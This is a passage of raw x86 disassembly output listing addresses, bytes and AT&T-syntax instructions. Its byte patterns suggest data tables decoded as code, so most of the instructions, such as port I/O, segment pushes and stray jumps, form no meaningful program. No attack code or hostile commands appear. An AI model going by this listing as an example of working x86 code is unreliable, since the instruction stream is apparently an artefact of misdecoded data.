  406983:	00 bf 06 00 00 01    	add    %bh,0x1000006(%edi)
  406989:	00 86 02 00 00 02    	add    %al,0x2000002(%esi)
  40698f:	00 de                	add    %bl,%dh
  406991:	1a 00                	sbb    (%eax),%al
  406993:	00 01                	add    %al,(%ecx)
  406995:	00 e5                	add    %ah,%ch
  406997:	06                   	push   %es
  406998:	00 00                	add    %al,(%eax)
  40699a:	01 00                	add    %eax,(%eax)
  40699c:	a1 07 00 00 02       	mov    0x2000007,%eax
  4069a1:	00 6b 09             	add    %ch,0x9(%ebx)
  4069a4:	00 00                	add    %al,(%eax)
  4069a6:	01 00                	add    %eax,(%eax)
  4069a8:	3c 04                	cmp    $0x4,%al
  4069aa:	00 00                	add    %al,(%eax)
  4069ac:	01 00                	add    %eax,(%eax)
  4069ae:	54                   	push   %esp
  4069af:	03 00                	add    (%eax),%eax
  4069b1:	00 01                	add    %al,(%ecx)
  4069b3:	00 04 13             	add    %al,(%ebx,%edx,1)
  4069b6:	00 00                	add    %al,(%eax)
  4069b8:	01 00                	add    %eax,(%eax)
  4069ba:	a3 02 00 00 01       	mov    %eax,0x1000002
  4069bf:	00 9e 09 00 00 02    	add    %bl,0x2000009(%esi)
  4069c5:	00 d3                	add    %dl,%bl
  4069c7:	03 00                	add    (%eax),%eax
  4069c9:	00 01                	add    %al,(%ecx)
  4069cb:	00 56 24             	add    %dl,0x24(%esi)
  4069ce:	00 00                	add    %al,(%eax)
  4069d0:	02 00                	add    (%eax),%al
  4069d2:	f7 19                	negl   (%ecx)
  4069d4:	00 00                	add    %al,(%eax)
  4069d6:	03 00                	add    (%eax),%eax
  4069d8:	77 07                	ja     0x4069e1
  4069da:	00 00                	add    %al,(%eax)
  4069dc:	01 00                	add    %eax,(%eax)
  4069de:	34 09                	xor    $0x9,%al
  4069e0:	00 00                	add    %al,(%eax)
  4069e2:	02 00                	add    (%eax),%al
  4069e4:	b6 01                	mov    $0x1,%dh
  4069e6:	00 00                	add    %al,(%eax)
  4069e8:	01 00                	add    %eax,(%eax)
  4069ea:	dd 12                	fstl   (%edx)
  4069ec:	00 00                	add    %al,(%eax)
  4069ee:	01 00                	add    %eax,(%eax)
  4069f0:	5c                   	pop    %esp
  4069f1:	0a 00                	or     (%eax),%al
  4069f3:	00 01                	add    %al,(%ecx)
  4069f5:	00 4a 01             	add    %cl,0x1(%edx)
  4069f8:	00 00                	add    %al,(%eax)
  4069fa:	01 00                	add    %eax,(%eax)
  4069fc:	40                   	inc    %eax
  4069fd:	15 00 00 01 00       	adc    $0x10000,%eax
  406a02:	35 26 00 00 01       	xor    $0x1000026,%eax
  406a07:	00 81 14 00 00 01    	add    %al,0x1000014(%ecx)
  406a0d:	00 04 0a             	add    %al,(%edx,%ecx,1)
  406a10:	00 00                	add    %al,(%eax)
  406a12:	01 00                	add    %eax,(%eax)
  406a14:	1b 07                	sbb    (%edi),%eax
  406a16:	00 00                	add    %al,(%eax)
  406a18:	01 00                	add    %eax,(%eax)
  406a1a:	0e                   	push   %cs
  406a1b:	0b 00                	or     (%eax),%eax
  406a1d:	00 01                	add    %al,(%ecx)
  406a1f:	00 05 1b 00 00 01    	add    %al,0x100001b
  406a25:	00 eb                	add    %ch,%bl
  406a27:	1a 00                	sbb    (%eax),%al
  406a29:	00 02                	add    %al,(%edx)
  406a2b:	00 e0                	add    %ah,%al
  406a2d:	07                   	pop    %es
  406a2e:	00 00                	add    %al,(%eax)
  406a30:	01 00                	add    %eax,(%eax)
  406a32:	03 04 00             	add    (%eax,%eax,1),%eax
  406a35:	00 01                	add    %al,(%ecx)
  406a37:	00 f4                	add    %dh,%ah
  406a39:	02 00                	add    (%eax),%al
  406a3b:	00 01                	add    %al,(%ecx)
  406a3d:	00 71 04             	add    %dh,0x4(%ecx)
  406a40:	00 00                	add    %al,(%eax)
  406a42:	01 00                	add    %eax,(%eax)
  406a44:	e1 03                	loope  0x406a49
  406a46:	06                   	push   %es
  406a47:	00 2d 00 08 00 35    	add    %ch,0x35000800
  406a4d:	00 59 00             	add    %bl,0x0(%ecx)
  406a50:	d8 21                	fsubs  (%ecx)
  406a52:	04 01                	add    $0x1,%al
  406a54:	59                   	pop    %ecx
  406a55:	00 bf 22 08 01 59    	add    %bh,0x59010822(%edi)
  406a5b:	00 ef                	add    %ch,%bh
  406a5d:	20 0e                	and    %cl,(%esi)
  406a5f:	00 69 00             	add    %ch,0x0(%ecx)
  406a62:	1c 1d                	sbb    $0x1d,%al
  406a64:	b2 01                	mov    $0x1,%dl
  406a66:	c9                   	leave
  406a67:	00 34 1d fa 02 d1 00 	add    %dh,0xd102fa(,%ebx,1)
  406a6e:	34 1d                	xor    $0x1d,%al
  406a70:	0e                   	push   %cs
  406a71:	00 d9                	add    %bl,%cl
  406a73:	00 34 1d 27 03 e9 00 	add    %dh,0xe90327(,%ebx,1)
  406a7a:	34 1d                	xor    $0x1d,%al
  406a7c:	53                   	push   %ebx
  406a7d:	01 f1                	add    %esi,%ecx
  406a7f:	00 34 1d 53 01 f9 00 	add    %dh,0xf90153(,%ebx,1)
  406a86:	34 1d                	xor    $0x1d,%al
  406a88:	53                   	push   %ebx
  406a89:	01 01                	add    %eax,(%ecx)
  406a8b:	01 34 1d 53 01 09 01 	add    %esi,0x1090153(,%ebx,1)
  406a92:	34 1d                	xor    $0x1d,%al
  406a94:	53                   	push   %ebx
  406a95:	01 11                	add    %edx,(%ecx)
  406a97:	01 34 1d 53 01 19 01 	add    %esi,0x1190153(,%ebx,1)
  406a9e:	34 1d                	xor    $0x1d,%al
  406aa0:	53                   	push   %ebx
  406aa1:	01 21                	add    %esp,(%ecx)
  406aa3:	01 34 1d 99 01 29 01 	add    %esi,0x1290199(,%ebx,1)
  406aaa:	34 1d                	xor    $0x1d,%al
  406aac:	53                   	push   %ebx
  406aad:	01 31                	add    %esi,(%ecx)
  406aaf:	01 34 1d 53 01 39 01 	add    %esi,0x1390153(,%ebx,1)
  406ab6:	34 1d                	xor    $0x1d,%al
  406ab8:	0e                   	push   %cs
  406ab9:	00 41 01             	add    %al,0x1(%ecx)
  406abc:	34 1d                	xor    $0x1d,%al
  406abe:	53                   	push   %ebx
  406abf:	01 49 01             	add    %ecx,0x1(%ecx)
  406ac2:	16                   	push   %ss
  406ac3:	1b 7f 00             	sbb    0x0(%edi),%edi
  406ac6:	51                   	push   %ecx
  406ac7:	01 44 00 bd          	add    %eax,-0x43(%eax,%eax,1)
  406acb:	03 59 01             	add    0x1(%ecx),%ebx
  406ace:	11 21                	adc    %esp,(%ecx)
  406ad0:	7f 00                	jg     0x406ad2
  406ad2:	51                   	push   %ecx
  406ad3:	01 7a 18             	add    %edi,0x18(%edx)
  406ad6:	84 00                	test   %al,(%eax)
  406ad8:	61                   	popa
  406ad9:	01 34 1d 0e 00 61 01 	add    %esi,0x161000e(,%ebx,1)
  406ae0:	c3                   	ret
  406ae1:	22 c2                	and    %dl,%al
  406ae3:	03 09                	add    (%ecx),%ecx
  406ae5:	00 34 1d 0e 00 69 01 	add    %dh,0x169000e(,%ebx,1)
  406aec:	8a 00                	mov    (%eax),%al
  406aee:	cc                   	int3
  406aef:	03 51 01             	add    0x1(%ecx),%edx
  406af2:	e4 13                	in     $0x13,%al
  406af4:	c7 00 69 01 36 14    	movl   $0x14360169,(%eax)
  406afa:	d2 03                	rolb   %cl,(%ebx)
  406afc:	11 00                	adc    %eax,(%eax)
  406afe:	34 1d                	xor    $0x1d,%al
  406b00:	79 01                	jns    0x406b03
  406b02:	11 00                	adc    %eax,(%eax)
  406b04:	22 25 d8 03 71 01    	and    0x17103d8,%ah
  406b0a:	fa                   	cli
  406b0b:	24 de                	and    $0xde,%al
  406b0d:	03 69 01             	add    0x1(%ecx),%ebp
  406b10:	f1                   	int1
  406b11:	1e                   	push   %ds
  406b12:	e4 03                	in     $0x3,%al
  406b14:	89 01                	mov    %eax,(%ecx)
  406b16:	d0 01                	rolb   $1,(%ecx)
  406b18:	6b 02 81             	imul   $0xffffff81,(%edx),%eax
  406b1b:	01 a8 14 ea 03 19    	add    %ebp,0x1903ea14(%eax)
  406b21:	00 34 1d 08 04 19 00 	add    %dh,0x190408(,%ebx,1)
  406b28:	bb 12 fa 02 19       	mov    $0x1902fa12,%ebx
  406b2d:	00 a8 12 fa 02 c9    	add    %ch,-0x36fd05ee(%eax)
  406b33:	01 ad 25 a5 02 c9    	add    %ebp,-0x36fd5adb(%ebp)
  406b39:	01 0b                	add    %ecx,(%ebx)
  406b3b:	21 15 04 61 01 c3    	and    %edx,0xc3016104
  406b41:	22 1c 04             	and    (%esp,%eax,1),%bl
  406b44:	d9 01                	flds   (%ecx)
  406b46:	92                   	xchg   %eax,%edx
  406b47:	1e                   	push   %ds
  406b48:	21 04 19             	and    %eax,(%ecx,%ebx,1)
  406b4b:	00 ab 20 29 04 19    	add    %ch,0x19042920(%ebx)
  406b51:	00 08                	add    %cl,(%eax)
  406b53:	0c 08                	or     $0x8,%al
  406b55:	01 19                	add    %ebx,(%ecx)
  406b57:	00 ab 20 8a 01 a1    	add    %ch,-0x5efe75e0(%ebx)
  406b5d:	01 34 1d 0e 00 a9 01 	add    %esi,0x1a9000e(,%ebx,1)
  406b64:	34 1d                	xor    $0x1d,%al
  406b66:	84 01                	test   %al,(%ecx)
  406b68:	a1 01 5a 1f 31       	mov    0x311f5a01,%eax
  406b6d:	04 a1                	add    $0xa1,%al
  406b6f:	01 04 14             	add    %eax,(%esp,%edx,1)
  406b72:	de 02                	fiadds (%edx)
  406b74:	c9                   	leave
  406b75:	01 0b                	add    %ecx,(%ebx)
  406b77:	21 38                	and    %edi,(%eax)
  406b79:	04 f1                	add    $0xf1,%al
  406b7b:	01 12                	add    %edx,(%edx)
  406b7d:	10 0e                	adc    %cl,(%esi)
  406b7f:	00 f9                	add    %bh,%cl
  406b81:	01 34 1d 42 04 01 02 	add    %esi,0x2010442(,%ebx,1)
  406b88:	34 1d                	xor    $0x1d,%al
  406b8a:	49                   	dec    %ecx
  406b8b:	04 21                	add    $0x21,%al
  406b8d:	00 34 1d 4f 04 19 00 	add    %dh,0x19044f(,%ebx,1)
  406b94:	0a 22                	or     (%edx),%ah
  406b96:	59                   	pop    %ecx
  406b97:	04 09                	add    $0x9,%al
  406b99:	00 13                	add    %dl,(%ebx)
  406b9b:	14 95                	adc    $0x95,%al
  406b9d:	01 21                	add    %esp,(%ecx)
  406b9f:	00 86 21 5f 04 29    	add    %al,0x29045f21(%esi)
  406ba5:	02 34 1d 49 04 29 00 	add    0x290449(,%ebx,1),%dh
  406bac:	34 1d                	xor    $0x1d,%al
  406bae:	6b 04 31 02          	imul   $0x2,(%ecx,%esi,1),%eax
  406bb2:	34 1d                	xor    $0x1d,%al
  406bb4:	49                   	dec    %ecx
  406bb5:	04 71                	add    $0x71,%al
  406bb7:	00 e0                	add    %ah,%al
  406bb9:	0b 75 04             	or     0x4(%ebp),%esi
  406bbc:	39 02                	cmp    %eax,(%edx)
  406bbe:	6d                   	insl   (%dx),%es:(%edi)
  406bbf:	0f 82 04 31 00 6a    	jb     0x6a409cc9
  406bc5:	1f                   	pop    %ds
  406bc6:	89 04 29             	mov    %eax,(%ecx,%ebp,1)
  406bc9:	00 12                	add    %dl,(%edx)
  406bcb:	10 0e                	adc    %cl,(%esi)
  406bcd:	00 71 00             	add    %dh,0x0(%ecx)
  406bd0:	12 10                	adc    (%eax),%dl
  406bd2:	0e                   	push   %cs
  406bd3:	00 19                	add    %bl,(%ecx)
  406bd5:	00 12                	add    %dl,(%edx)
  406bd7:	10 0e                	adc    %cl,(%esi)
  406bd9:	00 71 00             	add    %dh,0x0(%ecx)
  406bdc:	d8 0b                	fmuls  (%ebx)
  406bde:	94                   	xchg   %eax,%esp
  406bdf:	04 49                	add    $0x49,%al
  406be1:	02 44 00 9a          	add    -0x66(%eax,%eax,1),%al
  406be5:	04 71                	add    $0x71,%al
  406be7:	00 e5                	add    %ah,%ch
  406be9:	0b a1 04 51 02 34    	or     0x34025104(%ecx),%esp
  406bef:	1d 49 04 49 01       	sbb    $0x1490449,%eax
  406bf4:	34 1d                	xor    $0x1d,%al
  406bf6:	a9 04 49 01 64       	test   $0x64014904,%eax
  406bfb:	22 b0 04 61 02 bb    	and    -0x44fd9efc(%eax),%dh
  406c01:	1c c2                	sbb    $0xc2,%al
  406c03:	04 49                	add    $0x49,%al
  406c05:	02 f1                	add    %cl,%dh
  406c07:	1e                   	push   %ds
  406c08:	e0 00                	loopne 0x406c0a
  406c0a:	19 00                	sbb    %eax,(%eax)
  406c0c:	c4 16                	les    (%esi),%edx
  406c0e:	c9                   	leave
  406c0f:	04 71                	add    $0x71,%al
  406c11:	00 6a 10             	add    %ch,0x10(%edx)
  406c14:	d1 04 59             	roll   $1,(%ecx,%ebx,2)
  406c17:	02 34 1d 79 01 71 00 	add    0x710179(,%ebx,1),%dh
  406c1e:	84 19                	test   %bl,(%ecx)
  406c20:	63 01                	arpl   %eax,(%ecx)
  406c22:	71 00                	jno    0x406c24
  406c24:	b3 14                	mov    $0x14,%bl
  406c26:	0e                   	push   %cs
  406c27:	00 61 02             	add    %ah,0x2(%ecx)
  406c2a:	11 21                	adc    %esp,(%ecx)
  406c2c:	9a 00 c9 01 63 20 d9 	lcall  $0xd920,$0x6301c900
  406c33:	04 71                	add    $0x71,%al
  406c35:	02 a3 20 0a 00 79    	add    0x79000a20(%ebx),%ah
  406c3b:	02 34 1d 0e 00 c9 01 	add    0x1c9000e(,%ebx,1),%dh
  406c42:	6f                   	outsl  %ds:(%esi),(%dx)
  406c43:	20 e9                	and    %ch,%cl
  406c45:	04 79                	add    $0x79,%al
  406c47:	02 51 0d             	add    0xd(%ecx),%dl
  406c4a:	ef                   	out    %eax,(%dx)
  406c4b:	04 49                	add    $0x49,%al
  406c4d:	02 f1                	add    %cl,%dh
  406c4f:	1e                   	push   %ds
  406c50:	da 00                	fiaddl (%eax)
  406c52:	49                   	dec    %ecx
  406c53:	02 f1                	add    %cl,%dh
  406c55:	1e                   	push   %ds
  406c56:	ec                   	in     (%dx),%al
  406c57:	00 51 00             	add    %dl,0x0(%ecx)
  406c5a:	34 1d                	xor    $0x1d,%al
  406c5c:	0e                   	push   %cs
  406c5d:	00 0c 00             	add    %cl,(%eax,%eax,1)
  406c60:	66 17                	popw   %ss
  406c62:	04 05                	add    $0x5,%al
  406c64:	0c 00                	or     $0x0,%al
  406c66:	1d 22 3d 01 c9       	sbb    $0xc9013d22,%eax
  406c6b:	01 ce                	add    %ecx,%esi
  406c6d:	1c 95                	sbb    $0x95,%al
  406c6f:	01 0c 00             	add    %ecx,(%eax,%eax,1)
  406c72:	85 1b                	test   %ebx,(%ebx)
  406c74:	0e                   	push   %cs
  406c75:	00 0c 00             	add    %cl,(%eax,%eax,1)
  406c78:	f6 0b 0f             	testb  $0xf,(%ebx)
  406c7b:	05 0c 00 1c 1d       	add    $0x1d1c000c,%eax
  406c80:	24 05                	and    $0x5,%al
  406c82:	14 00                	adc    $0x0,%al
  406c84:	d8 21                	fsubs  (%ecx)
  406c86:	36 05 c9 01 6a 1f    	ss add $0x1f6a01c9,%eax
  406c8c:	90                   	nop
  406c8d:	01 14 00             	add    %edx,(%eax,%eax,1)
  406c90:	bf 22 08 01 71       	mov    $0x71010822,%edi
  406c95:	00 16                	add    %dl,(%esi)
  406c97:	12 43 05             	adc    0x5(%ebx),%al
  406c9a:	49                   	dec    %ecx
  406c9b:	02 f1                	add    %cl,%dh
  406c9d:	1e                   	push   %ds
  406c9e:	e6 00                	out    %al,$0x0
  406ca0:	51                   	push   %ecx
  406ca1:	01 5d 00             	add    %ebx,0x0(%ebp)
  406ca4:	4d                   	dec    %ebp
  406ca5:	05 c9 01 bf 17       	add    $0x17bf01c9,%eax
  406caa:	95                   	xchg   %eax,%ebp
  406cab:	01 91 02 1a 10 52    	add    %edx,0x52101a02(%ecx)
  406cb1:	05 51 01 5d 00       	add    $0x5d0151,%eax
  406cb6:	57                   	push   %edi
  406cb7:	05 51 01 5d 00       	add    $0x5d0151,%eax
  406cbc:	5c                   	pop    %esp
  406cbd:	05 51 01 5d 00       	add    $0x5d0151,%eax
  406cc2:	61                   	popa
  406cc3:	05 51 01 66 00       	add    $0x660151,%eax
  406cc8:	68 05 89 02 1a       	push   $0x1a028905
  406ccd:	10 6d 05             	adc    %ch,0x5(%ebp)
  406cd0:	51                   	push   %ecx
  406cd1:	01 66 00             	add    %esp,0x0(%esi)
  406cd4:	72 05                	jb     0x406cdb
  406cd6:	51                   	push   %ecx
  406cd7:	01 66 00             	add    %esp,0x0(%esi)
  406cda:	77 05                	ja     0x406ce1
  406cdc:	51                   	push   %ecx
  406cdd:	01 66 00             	add    %esp,0x0(%esi)
  406ce0:	7c 05                	jl     0x406ce7
  406ce2:	51                   	push   %ecx
  406ce3:	01 2e                	add    %ebp,(%esi)
  406ce5:	0e                   	push   %cs
  406ce6:	83 05 99 02 1a 10 88 	addl   $0xffffff88,0x101a0299
  406ced:	05 49 02 f1 1e       	add    $0x1ef10249,%eax
  406cf2:	95                   	xchg   %eax,%ebp
  406cf3:	05 a9 02 87 25       	add    $0x258702a9,%eax
  406cf8:	71 01                	jno    0x406cfb
  406cfa:	b9 02 4b 20 84       	mov    $0x84204b02,%ecx
  406cff:	00 b1 02 34 1d a6    	add    %dh,-0x59e2cbfe(%ecx)
  406d05:	05 71 00 e6 14       	add    $0x14e60071,%eax
  406d0a:	71 01                	jno    0x406d0d
  406d0c:	71 00                	jno    0x406d0e
  406d0e:	0c 10                	or     $0x10,%al
  406d10:	0e                   	push   %cs
  406d11:	00 b1 02 34 1d b4    	add    %dh,-0x4be2cbfe(%ecx)
  406d17:	05 d9 02 d6 24       	add    $0x24d602d9,%eax
  406d1c:	c8 05 59 02          	enter  $0x5905,$0x2
  406d20:	34 1d                	xor    $0x1d,%al
  406d22:	0e                   	push   %cs
  406d23:	00 71 00             	add    %dh,0x0(%ecx)
  406d26:	0d 12 3d 01 91       	or     $0x91013d12,%eax
  406d2b:	01 34 1d 53 01 49 02 	add    %esi,0x2490153(,%ebx,1)
  406d32:	6e                   	outsb  %ds:(%esi),(%dx)
  406d33:	00 de                	add    %bl,%dh
  406d35:	05 49 02 94 0e       	add    $0xe940249,%eax
  406d3a:	e5 05                	in     $0x5,%eax
  406d3c:	49                   	dec    %ecx
  406d3d:	02 2e                	add    (%esi),%ch
  406d3f:	0e                   	push   %cs
  406d40:	ec                   	in     (%dx),%al
  406d41:	05 49 02 3b 00       	add    $0x3b0249,%eax
  406d46:	f3 05 49 02 5d 00    	repz add $0x5d0249,%eax
  406d4c:	fa                   	cli
  406d4d:	05 49 02 77 00       	add    $0x770249,%eax
  406d52:	01 06                	add    %eax,(%esi)
  406d54:	49                   	dec    %ecx
  406d55:	02 66 00             	add    0x0(%esi),%ah
  406d58:	08 06                	or     %al,(%esi)
  406d5a:	0c 00                	or     $0x0,%al
  406d5c:	34 1d                	xor    $0x1d,%al
  406d5e:	0e                   	push   %cs
  406d5f:	00 49 02             	add    %cl,0x2(%ecx)
  406d62:	f1                   	int1
  406d63:	1e                   	push   %ds
  406d64:	3a 06                	cmp    (%esi),%al
  406d66:	59                   	pop    %ecx
  406d67:	01 6a 1e             	add    %ebp,0x1e(%edx)
  406d6a:	6b 02 19             	imul   $0x19,(%edx),%eax
  406d6d:	03 b0 0f d9 04 f9    	add    -0x6fb26f1(%eax),%esi
  406d73:	02 34 1d 53 01 81 00 	add    0x810153(,%ebx,1),%dh
  406d7a:	01 20                	add    %esp,(%eax)
  406d7c:	5d                   	pop    %ebp
  406d7d:	06                   	push   %es
  406d7e:	81 00 be 0e 62 06    	addl   $0x6620ebe,(%eax)
  406d84:	21 03                	and    %eax,(%ebx)
  406d86:	fe 0e                	decb   (%esi)
  406d88:	95                   	xchg   %eax,%ebp
  406d89:	01 29                	add    %ebp,(%ecx)
  406d8b:	03 53 0f             	add    0xf(%ebx),%edx
  406d8e:	95                   	xchg   %eax,%ebp
  406d8f:	01 c9                	add    %ecx,%ecx
  406d91:	01 b9 25 a5 02 81    	add    %edi,-0x7efd5adb(%ecx)
  406d97:	00 85 1e 68 06 81    	add    %al,-0x7ef997e2(%ebp)
  406d9d:	00 bf 16 0e 00 81    	add    %bh,-0x7efff1ea(%edi)
  406da3:	00 34 1d 0e 00 01 03 	add    %dh,0x301000e(,%ebx,1)
  406daa:	34 1d                	xor    $0x1d,%al
  406dac:	0e                   	push   %cs
  406dad:	00 01                	add    %al,(%ecx)
  406daf:	03 0b                	add    (%ebx),%ecx
  406db1:	0f 53 01             	rcpps  (%ecx),%xmm0
  406db4:	19 03                	sbb    %eax,(%ebx)
  406db6:	d2 18                	rcrb   %cl,(%eax)
  406db8:	6b 02 c9             	imul   $0xffffffc9,(%edx),%eax
  406dbb:	01 63 20             	add    %esp,0x20(%ebx)
  406dbe:	6e                   	outsb  %ds:(%esi),(%dx)
  406dbf:	06                   	push   %es
  406dc0:	01 03                	add    %eax,(%ebx)
  406dc2:	30 20                	xor    %ah,(%eax)
  406dc4:	53                   	push   %ebx
  406dc5:	01 01                	add    %eax,(%ecx)
  406dc7:	03 db                	add    %ebx,%ebx
  406dc9:	0e                   	push   %cs
  406dca:	74 06                	je     0x406dd2
  406dcc:	01 03                	add    %eax,(%ebx)
  406dce:	02 24 99             	add    (%ecx,%ebx,4),%ah
  406dd1:	01 81 00 7e 1a 7b    	add    %eax,0x7b1a7e00(%ecx)
  406dd7:	06                   	push   %es
  406dd8:	81 00 64 22 08 01    	addl   $0x1082264,(%eax)
  406dde:	39 03                	cmp    %eax,(%ebx)
  406de0:	97                   	xchg   %eax,%edi
  406de1:	1c 82                	sbb    $0x82,%al
  406de3:	06                   	push   %es
  406de4:	41                   	inc    %ecx
  406de5:	03 20                	add    (%eax),%esp
  406de7:	10 6b 02             	adc    %ch,0x2(%ebx)
  406dea:	09 03                	or     %eax,(%ebx)
  406dec:	17                   	pop    %ss
  406ded:	25 87 06 c9 01       	and    $0x1c90687,%eax
  406df2:	63 20                	arpl   %esp,(%eax)
  406df4:	91                   	xchg   %eax,%ecx
  406df5:	06                   	push   %es
  406df6:	09 03                	or     %eax,(%ebx)
  406df8:	35 12 98 06 b9       	xor    $0xb9069812,%eax
  406dfd:	02 5a 10             	add    0x10(%edx),%bl
  406e00:	b1 02                	mov    $0x2,%cl
  406e02:	b9 02 e4 1e c7       	mov    $0xc71ee402,%ecx
  406e07:	00 61 01             	add    %ah,0x1(%ecx)
  406e0a:	fa                   	cli
  406e0b:	1e                   	push   %ds
  406e0c:	79 01                	jns    0x406e0f
  406e0e:	19 03                	sbb    %eax,(%ebx)
  406e10:	18 0f                	sbb    %cl,(%edi)
  406e12:	67 02 11             	add    (%bx,%di),%dl
  406e15:	03 34 1d 53 01 51 03 	add    0x3510153(,%ebx,1),%esi
  406e1c:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  406e1d:	0f 53 01             	rcpps  (%ecx),%xmm0
  406e20:	19 03                	sbb    %eax,(%ebx)
  406e22:	da 14 67             	ficoml (%edi,%eiz,2)
  406e25:	02 19                	add    (%ecx),%bl
  406e27:	03 28                	add    (%eax),%ebp
  406e29:	0f 6b 02             	packssdw (%edx),%mm0
  406e2c:	01 03                	add    %eax,(%ebx)
  406e2e:	59                   	pop    %ecx
  406e2f:	14 99                	adc    $0x99,%al
  406e31:	01 01                	add    %eax,(%ecx)
  406e33:	03 f9                	add    %ecx,%edi
  406e35:	11 99 01 81 00 64    	adc    %ebx,0x64008101(%ecx)
  406e3b:	22 9e 06 59 01 77    	and    0x77015906(%esi),%bl
  406e41:	22 b1 02 59 01 90    	and    -0x6ffea6fe(%ecx),%dh
  406e47:	25 67 02 19 03       	and    $0x3190267,%eax
  406e4c:	3a 22                	cmp    (%edx),%ah
  406e4e:	6b 02 59             	imul   $0x59,(%edx),%eax
  406e51:	03 34 1d 53 01 59 03 	add    0x3590153(,%ebx,1),%esi
  406e58:	7c 12                	jl     0x406e6c
  406e5a:	71 01                	jno    0x406e5d
  406e5c:	61                   	popa
  406e5d:	03 34 1d 0e 00 61 03 	add    0x361000e(,%ebx,1),%esi
  406e64:	44                   	inc    %esp
  406e65:	0f 95 01             	setne  (%ecx)
  406e68:	c9                   	leave
  406e69:	01 97 1f 90 01 69    	add    %edx,0x6901901f(%edi)
  406e6f:	03 34 1d 53 01 69 03 	add    0x3690153(,%ebx,1),%esi
  406e76:	b3 20                	mov    $0x20,%bl
  406e78:	bc 06 71 03 1c       	mov    $0x1c037106,%esp
  406e7d:	1d c2 06 79 03       	sbb    $0x37906c2,%eax
  406e82:	d8 21                	fsubs  (%ecx)
  406e84:	c8 06 81 03          	enter  $0x8106,$0x3
  406e88:	66 17                	popw   %ss
  406e8a:	ce                   	into
  406e8b:	06                   	push   %es
  406e8c:	c9                   	leave
  406e8d:	01 33                	add    %esi,(%ebx)
  406e8f:	21 95 01 79 03 bf    	and    %edx,-0x40fc86ff(%ebp)
  406e95:	22 08                	and    (%eax),%cl
  406e97:	01 81 00 37 0e d8    	add    %eax,-0x27f1c900(%ecx)
  406e9d:	06                   	push   %es
  406e9e:	89 03                	mov    %eax,(%ebx)
  406ea0:	44                   	inc    %esp
  406ea1:	00 3d 01 81 00 9d    	add    %bh,0x9d008101
  406ea7:	0b 3d 01 91 03 13    	or     0x13039101,%edi
  406ead:	14 95                	adc    $0x95,%al
  406eaf:	01 99 03 72 22 f6    	add    %ebx,-0x9dd8dfd(%ecx)
  406eb5:	06                   	push   %es
  406eb6:	99                   	cltd
  406eb7:	03 16                	add    (%esi),%edx
  406eb9:	21 09                	and    %ecx,(%ecx)
  406ebb:	07                   	pop    %es
  406ebc:	59                   	pop    %ecx
  406ebd:	01 27                	add    %esp,(%edi)
  406ebf:	22 7b 00             	and    0x0(%ebx),%bh
  406ec2:	59                   	pop    %ecx
  406ec3:	01 60 0f             	add    %esp,0xf(%eax)
  406ec6:	67 02 59 01          	add    0x1(%bx,%di),%bl
  406eca:	34 0f                	xor    $0xf,%al
  406ecc:	67 02 59 01          	add    0x1(%bx,%di),%bl
  406ed0:	ee                   	out    %al,(%dx)
  406ed1:	18 1a                	sbb    %bl,(%edx)
  406ed3:	07                   	pop    %es
  406ed4:	c9                   	leave
  406ed5:	01 63 20             	add    %esp,0x20(%ebx)
  406ed8:	20 07                	and    %al,(%edi)
  406eda:	b1 03                	mov    $0x3,%cl
  406edc:	34 1d                	xor    $0x1d,%al
  406ede:	0e                   	push   %cs
  406edf:	00 69 01             	add    %ch,0x1(%ecx)
  406ee2:	ed                   	in     (%dx),%eax
  406ee3:	03 cc                	add    %esp,%ecx
  406ee5:	03 b9 03 9c 14 e3    	add    -0x1ceb63fd(%ecx),%edi
  406eeb:	02 21                	add    (%ecx),%ah
  406eed:	02 13                	add    (%ebx),%dl
  406eef:	14 de                	adc    $0xde,%al
  406ef1:	02 c9                	add    %cl,%cl
  406ef3:	01 40 14             	add    %eax,0x14(%eax)
  406ef6:	32 07                	xor    (%edi),%al
  406ef8:	c9                   	leave
  406ef9:	01 8f 1c 95 01 c9    	add    %ecx,-0x36fe6ae4(%edi)
  406eff:	01 77 0d             	add    %esi,0xd(%edi)
  406f02:	3f                   	aas
  406f03:	07                   	pop    %es
  406f04:	59                   	pop    %ecx
  406f05:	01 6f 17             	add    %ebp,0x17(%edi)
  406f08:	1d 00 f1 02 13       	sbb    $0x1302f100,%eax
  406f0d:	14 95                	adc    $0x95,%al
  406f0f:	01 c1                	add    %eax,%ecx
  406f11:	03 c7                	add    %edi,%eax
  406f13:	14 67                	adc    $0x67,%al
  406f15:	02 29                	add    (%ecx),%ch
  406f17:	03 84 0f 45 07 a9 02 	add    0x2a90745(%edi,%ecx,1),%eax
  406f1e:	96                   	xchg   %eax,%esi
  406f1f:	0f 45 07             	cmovne (%edi),%eax
  406f22:	a9 02 13 14 95       	test   $0x95141302,%eax
  406f27:	01 c9                	add    %ecx,%ecx
  406f29:	03 e4                	add    %esp,%esp
  406f2b:	21 4b 07             	and    %ecx,0x7(%ebx)
  406f2e:	d1 03                	roll   $1,(%ebx)
  406f30:	34 1d                	xor    $0x1d,%al
  406f32:	51                   	push   %ecx
  406f33:	07                   	pop    %es
  406f34:	d1 03                	roll   $1,(%ebx)
  406f36:	a2 0e 58 07 19       	mov    %al,0x1907580e
  406f3b:	00 0c 10             	add    %cl,(%eax,%edx,1)
  406f3e:	0e                   	push   %cs
  406f3f:	00 69 03             	add    %ch,0x3(%ecx)
  406f42:	34 1d                	xor    $0x1d,%al
  406f44:	84 01                	test   %al,(%ecx)
  406f46:	24 00                	and    $0x0,%al
  406f48:	34 1d                	xor    $0x1d,%al
  406f4a:	0e                   	push   %cs
  406f4b:	00 24 00             	add    %ah,(%eax,%eax,1)
  406f4e:	f6 0b 0f             	testb  $0xf,(%ebx)
  406f51:	05 24 00 1d 22       	add    $0x221d0024,%eax
  406f56:	3d 01 24 00 e6       	cmp    $0xe6002401,%eax
  406f5b:	24 77                	and    $0x77,%al
  406f5d:	07                   	pop    %es
  406f5e:	c9                   	leave
  406f5f:	01 af 18 7d 07 89    	add    %ebp,-0x76f882e8(%edi)
  406f65:	00 c6                	add    %al,%dh
  406f67:	1f                   	pop    %ds
  406f68:	8d 07                	lea    (%edi),%eax
  406f6a:	89 00                	mov    %eax,(%eax)
  406f6c:	dd 01                	fldl   (%ecx)
  406f6e:	93                   	xchg   %eax,%ebx
  406f6f:	07                   	pop    %es
  406f70:	91                   	xchg   %eax,%ecx
  406f71:	00 44 0c 93          	add    %al,-0x6d(%esp,%ecx,1)
  406f75:	07                   	pop    %es
  406f76:	e1 03                	loope  0x406f7b
  406f78:	ad                   	lods   %ds:(%esi),%eax
